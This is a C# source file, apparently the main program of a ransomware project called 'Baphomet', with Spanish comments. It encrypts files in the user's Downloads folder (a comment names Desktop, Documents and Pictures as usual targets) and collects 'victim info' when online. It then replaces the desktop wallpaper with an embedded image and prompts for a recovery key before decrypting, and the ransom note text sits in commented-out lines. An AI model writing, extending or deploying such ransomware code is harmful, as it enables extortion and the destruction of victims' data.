using Baphomet.Utilities;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet
{
    public class Program 
    {
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;
        private const uint SPIF_SENDWININICHANGE = 0x2;

        static void Main()
        {
            Cryptep cryptep = new Cryptep();
            Decrypt decrypt = new Decrypt();
            BackgroundPhoto photo = new BackgroundPhoto();
            NetInfo netInfo = new NetInfo();

            var key = cryptep.GenerateKey();
            var userName = Environment.UserName;

            //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
            var Dirs = new[] { "\\Downloads" };
            var  userDir = "C:\\Users\\" +userName;

            for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
            {
                var targetPath = userDir + Dirs[d];
                cryptep.directoryRoad(targetPath, key);
            }

            var internetCheck = netInfo.CheckInternetConnection();
            if(internetCheck != false)
            {
                //Obtengo la data de la victima una vez cifre todos los directorios
                var victimInfo = netInfo.GetVictimInfo();
            }

            //Cambio el wallpaper Desktop
            var wallpaper = photo.imageBase64();
            ChangeWallpaper(wallpaper,userDir);

            //Muestro el mensaje de alerta y espero el password de recuperacion.
            string password = Message();

            for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
            {
                var decryp_targetPath = userDir + Dirs[d];
                decrypt.directoryRoad(decryp_targetPath, password);
            }

        }//</main>

        //Wallpaper method.
        private static void ChangeWallpaper(string imagebase64, string dropPath)
        {
            byte[] imageBytes = Convert.FromBase64String(imagebase64);
            MemoryStream ms = new MemoryStream(imageBytes, 0, imageBytes.Length);
            ms.Write(imageBytes, 0, imageBytes.Length);

            var myimage = ms.ToArray();
            File.WriteAllBytes(dropPath+"\\bapho.jpg", myimage);

            var filename = dropPath + "\\bapho.jpg";

            uint flag = 0;
            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0, filename, flag))
            {
                Console.WriteLine("Error");
            }
           
        }//</changeImgage>

        //Console message.
        static string Message()
        {
            Console.BackgroundColor = ConsoleColor.DarkRed;
            // Console.SetWindowSize(1024, 768);
            //Console.WriteLine("  Uppps, I think I have the soul of your documents kidnapped");
            //Console.WriteLine("-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
            //Console.WriteLine(" If you are seeing this message, it is possible that many of your important documents are encrypted.\n In order to recover your files back you must follow the instructions step by step.");
            //Console.WriteLine(" Do not attempt to change the extension of the encrypted file, otherwise you will lose the file. Do not turn off or restart your computer and do not try random keys (You only have 3 attempts, otherwise you will lose your files).\n");
            //Console.WriteLine("");
            Console.WriteLine("Enter your key here:");
            string password = Console.ReadLine();
            return password;
        }//</message>

    }
}
